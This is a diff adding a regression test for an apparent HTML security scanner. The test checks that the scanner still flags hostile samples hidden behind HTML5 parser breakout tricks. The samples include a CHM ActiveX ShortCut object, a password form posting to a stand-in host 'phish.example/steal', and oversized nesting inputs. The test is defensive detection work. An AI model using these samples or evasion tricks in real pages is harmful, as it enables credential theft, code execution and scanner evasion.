@@ -788,3 +788,58 @@ def test_review_r9_regressions_ns_stack_noscript_and_nested_object(
         b'<object></object><param name="Command" value="ShortCut"></object></body></html>'
     )
     assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r9_nested_obj.html", nested_obj))
+
+
+def test_review_r10_regressions_foreign_breakout_caps_and_endtag_runtime(
+    tmp_path: Path,
+) -> None:
+    chm = (
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+    )
+    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'
+
+    # Blocker 1a: <svg><style><div>... and <svg><script><p>... break out of foreign content in HTML5
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(
+        _scan(
+            tmp_path,
+            "r10_svg_style_div.html",
+            b"<!DOCTYPE html><html><body><svg><style><div>" + cred + b"</div></style></svg></body></html>",
+        )
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(
+        _scan(
+            tmp_path,
+            "r10_svg_script_p.html",
+            b"<!DOCTYPE html><html><body><svg><script><p>" + chm + b"</p></script></svg></body></html>",
+        )
+    )
+
+    # Blocker 1b: WHATWG breakout tags (<div>, </p>) & MathML integration points (<mtext>, <annotation-xml>)
+    for idx, doc in enumerate(
+        (
+            b"<!DOCTYPE html><html><body><svg><div><![CDATA[>" + cred + b"</body></html>",
+            b'<!DOCTYPE html><html><body><svg><div><textarea><x a="</textarea>'
+            + chm
+            + b'<!--"--></body></html>',
+            b'<!DOCTYPE html><html><body><math><mtext><textarea><x a="</textarea>'
+            + chm
+            + b'<!--"--></mtext></math></body></html>',
+            b'<!DOCTYPE html><html><body><math><annotation-xml encoding="text/html"><![CDATA[>'
+            + cred
+            + b"</annotation-xml></math></body></html>",
+            b"<!DOCTYPE html><html><body><svg></p><![CDATA[>" + cred + b"</body></html>",
+        )
+    ):
+        found = _rule_ids(_scan(tmp_path, f"r10_breakout_{idx}.html", doc))
+        assert ("HTML_CREDENTIAL_FORM" in found) or ("HTML_CHM_ACTIVEX" in found), f"case {idx}: {found}"
+
+    # Blocker 2: 1024 nested <object> before hhctrl <object> must NOT fail open
+    deep_obj = b"<!DOCTYPE html><html><body>" + b"<object>" * 1024 + chm + b"</body></html>"
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r10_deep_obj.html", deep_obj))
+
+    # Major 3: amortized O(1) handle_endtag on <svg>*1024 + </a>*200_000
+    adv_end = b"<!DOCTYPE html>" + b"<svg>" * 1024 + b"</a>" * 200_000
+    t0 = time.perf_counter()
+    _scan(tmp_path, "r10_adv_end.html", adv_end)
+    assert time.perf_counter() - t0 < 2.0
